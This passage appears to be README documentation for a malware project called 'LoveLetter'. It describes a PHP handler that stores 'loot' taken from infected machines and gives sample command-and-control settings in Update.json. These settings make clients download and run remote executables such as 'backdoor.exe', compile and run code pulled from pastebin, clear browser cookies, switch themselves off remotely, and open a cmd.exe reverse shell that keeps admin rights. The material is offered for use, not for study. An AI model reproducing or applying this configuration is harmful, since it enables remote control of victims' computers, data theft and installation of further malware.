## [TellMe.php](TellMe.php)
The PHP file that handles and stores loot from the letter and stores them nicely structured on the server.

<br/>
<div>
  <img width="100" align="right" src="../Repo/Images/2.gif" alt="LoveLetter"/>
  <br>
  <h1>⚙️ Configuration</h1>
  <p>Update.json is being fetched by the client to check for any server commands. You can update it to your liking.</p>
</div>

## Sample 
```json
{
  "updateVersion": 0,
  "letterVersion": 0.1,
  "downloadLink": "http://0.0.0.0/new_tll_update.exe",
  "killSelf": false,
  "clearCookies": false,
  "runnables": [
    {
      "item1": "http://0.0.0.0/backdoor.exe",
      "item2": 0.1
    }
  ],
  "snippets": [
    {
      "item1": "https://pastebin.com/raw/cBnRs3v7",
      "item2": 0.1
    }
  ]
}
```

## To be written...
> - Update Version ```updateVersion```

The version of the Update.json, always increment this whenever you updated the file, else the letter wont bother to load the json if the value is the same as the last.

> - Letter Version ```letterVersion```

The current latest version of the letter, increment this if you want the letter to download and execute ```downloadLink```.

> - Download Link ```downloadLink```

Direct download link to the newest executable.

> - Kill Self ```killSelf```

Put this to true whenever you want to remotely switch of all letters.

> - Clear Cookies ```clearCookies```

If true, it will clear all cookies and cache of ~~supported~~ popular browsers.

> - Runnables ```runnables```

Contains direct links and versions of executables to be downloaded and executed. Whenever an executable is updated please increment ```item2``` (it's named that way due to how Tuples behave in C#) doing so will trigger the letter to redownload the executable, else ignored. Ex.

```json
  "runnables": [
    {
      "item1": "http://0.0.0.0/backdoor.exe", // direct link to download
      "item2": 2.0 //version
    },
    {
      "item1": "http://0.0.0.0/evil_program.png", // extensions dont matter, it will be ran as executables anyways
      "item2": 0.1
    }
```

> - Snippets ```snippets```

Direct links to any text files that will be compiled as executables and ran. Ex.

```json
 "snippets": [
    {
      "item1": "https://pastebin.com/raw/cBnRs3v7", // the text inside this bin will be compiled
      "item2": 0.1
    },
    
    {
      "item1": "https://your-link-to-source-code.com/not-evil.txt",
      "item2": 0.1
    }
```
> - Open Shell? ```OpenShell```

If true, compiles a reverse shell and runs it.

> - Shell Bind Interface ```ShellBind```

The ip and port to bind the reverse shell with, it will listen on this interface for any incoming cmd.exe commands. If the letter runs with admin rights, the shell instance will have the same level of permissions as well.
<br/>
<br/>
**Goodluck 💖**